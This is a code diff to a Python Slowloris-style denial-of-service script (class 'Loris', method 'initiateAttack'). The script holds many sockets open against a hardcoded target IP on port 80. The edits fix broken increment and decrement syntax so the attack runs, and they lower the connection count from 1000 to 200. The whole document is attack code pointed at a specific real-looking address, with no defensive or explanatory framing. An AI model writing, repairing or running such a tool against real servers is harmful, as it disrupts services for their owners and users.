@@ -92,7 +92,7 @@ class Loris:
                     try:
                         sockets[i] = socket.create_connection((self.addr, self.port))
                         working[i] = True
-                        self.activeConnections++
+                        self.activeConnections += 1
                     except:
                         working[i] = False
                 if working[i]:
@@ -105,7 +105,7 @@ class Loris:
                             sockets[i].send(payload)
                         except:
                             working[i] = False
-                            self.activeConnections--
+                            self.activeConnections -= 1
 
             """ Send data """
             for i in range(0, self.connectionsPerThread):
@@ -117,14 +117,14 @@ class Loris:
                             sock.send(message)
                         except:
                             working[i] = False
-                            self.activeConnections--
+                            self.activeConnections -= 1
 
             """ Sleep for timeout """
             print "Currently active connections: " + str(self.activeConnections)
             time.sleep(self.timeout)
 
 def main():
-    loris = Loris(addr = "54.235.164.48", port = 80, totalConnections = 1000)
+    loris = Loris(addr = "54.235.164.48", port = 80, totalConnections = 200)
     loris.initiateAttack()
 
 if __name__ == "__main__":
